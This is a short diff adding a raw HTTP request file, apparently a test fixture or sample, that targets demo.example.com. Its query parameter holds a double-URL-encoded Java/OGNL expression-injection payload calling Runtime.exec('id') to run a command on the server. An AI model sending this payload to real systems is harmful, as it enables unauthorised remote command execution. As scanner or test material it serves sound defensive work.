@@ -1,0 +1,4 @@
+GET /a?data=%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2527id%2527%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
